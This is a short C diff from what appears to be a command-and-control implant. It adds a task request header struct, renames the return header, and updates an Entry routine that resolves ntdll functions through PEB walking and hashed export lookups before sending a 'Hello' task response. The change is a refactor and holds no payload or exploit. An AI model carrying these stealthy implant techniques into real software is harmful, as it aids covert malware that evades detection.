@@ -12,11 +12,19 @@
 
 typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
 {
+	UINT32	TaskCode;
+	UINT32	TaskId;
+	UINT32	TaskSize;
+	UCHAR	Buffer[0];
+} CMD_REQUEST_HDR ;
+
+typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
+{
 	UINT32	UniqueTaskId;
 	UINT32	ReturnCode;
 	UINT32	ErrorCode;
 	UCHAR	Buffer[0];
-} CMD_RET_HDR ;
+} CMD_RETURN_HDR ;
 
 typedef struct
 {
@@ -43,7 +51,8 @@ typedef struct
 D_SEC( B ) VOID WINAPI Entry( VOID )
 {
 	API		Api;
-	CMD_RET_HDR	Crh;
+	CMD_REQUEST_HDR	Req;
+	CMD_RETURN_HDR	Ret;
 
 	BOOL		Rcv = FALSE;
 	PBUFFER		Inb = NULL;
@@ -52,7 +61,8 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
+	RtlSecureZeroMemory( &Req, sizeof( Req ) );
+	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
 
 	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
@@ -70,7 +80,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
 
 				/* Append response task header */
-				if ( BufferAddRaw( Onb, &Crh, sizeof( Crh ) ) ) {
+				if ( BufferAddRaw( Onb, &Ret, sizeof( Ret ) ) ) {
 
 					/* Execute "Hello" */
 					if ( TaskHello( NULL, 0, Onb ) ) {
@@ -98,5 +108,6 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
+	RtlSecureZeroMemory( &Req, sizeof( Req ) );
+	RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
 };
